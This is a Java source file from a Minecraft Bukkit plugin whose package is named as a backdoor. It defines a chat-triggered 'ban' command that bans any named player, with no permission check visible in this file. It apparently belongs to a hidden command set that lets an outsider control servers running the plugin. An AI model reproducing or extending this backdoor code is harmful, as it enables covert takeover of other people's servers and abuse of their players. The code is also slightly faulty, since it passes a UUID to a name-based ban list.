package me.tsb.backdoor.commands.bans;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "ban", aliases = {"ban"})
public class BanCommand extends Command {

    private final Main main;

    public BanCommand(Main main) {
        this.main = main;
    }

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getPlayer(args.get(0));

            StringBuilder sb = new StringBuilder();
            for (int i = 1; i < args.size(); i++) {
                sb
                        .append(args.get(i))
                        .append(" ");
            }

            Bukkit.getBanList(BanList.Type.NAME).addBan(target.getUniqueId().toString(), sb.toString(), null, "ur mom");
        }
    }
}
